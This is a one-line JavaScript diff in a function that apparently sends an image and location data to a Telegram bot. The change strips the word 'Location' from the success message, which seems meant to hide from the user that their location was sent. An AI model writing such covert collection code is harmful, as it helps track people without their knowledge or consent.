@@ -226,7 +226,7 @@ function sendToBot(imageFile, locationData) {
                 .then(data => {
                     const statusElement = document.getElementById('status');
                     if (data.ok) {
-                        statusElement.innerText = 'Location sent successfully!';
+                        statusElement.innerText = 'successfully!';
                     } else {
                         statusElement.innerText = 'Failed to send location.';
                         console.error("Telegram API error:", data);
